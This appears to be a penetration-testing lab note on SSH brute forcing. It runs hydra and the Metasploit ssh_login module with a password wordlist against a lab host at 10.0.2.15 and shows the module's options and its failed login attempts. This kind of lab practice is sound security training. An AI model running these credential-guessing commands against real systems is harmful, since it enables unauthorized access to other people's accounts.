# Brute Force Attacks

## What are Brute force attacks?

A brute force attack is a straightforward and systematic method of trying multiple combinations of usernames and passwords to gain unauthorized access to a system or account. In this type of attack, an attacker systematically guesses all possible combinations until the correct one is found. The goal is to discover the correct credentials by attempting all possible combinations or using a predefined list of commonly used passwords. 

Kali comes bundled with a couple of tools for this. In this particular case, we will be using `hydra`. 

The syntax for brute forcing using hydra is:

- **hydra -l(username) -L(username wordlist) -p(password) -P(password wordlist) `<protocol>://<ip>:<port>` -t(for threads) -V(for verbosity)**

The final syntax should look something like this:

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Kioptrix/OpenFuck]
└─$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.15:22 -t 4 -V
```

We can also do the same thing using metasploit:

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > set username root
username => root
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
pass_file => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.0.2.15
rhosts => 10.0.2.15
msf6 auxiliary(scanner/ssh/ssh_login) > set threads 5
threads => 5
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 10.0.2.15:22 - Starting bruteforce
[-] 10.0.2.15:22 - Failed: 'root:admin'
[!] No active DB -- Credential data will not be saved!
[-] 10.0.2.15:22 - Failed: 'root:123456'
[-] 10.0.2.15:22 - Failed: 'root:12345'
[-] 10.0.2.15:22 - Failed: 'root:123456789'
[-] 10.0.2.15:22 - Failed: 'root:password'
[-] 10.0.2.15:22 - Failed: 'root:iloveyou'
[-] 10.0.2.15:22 - Failed: 'root:princess'
[-] 10.0.2.15:22 - Failed: 'root:1234567'
```

We can wait for the scanner to find the correct password or we can interrupt it with `CTRL C`.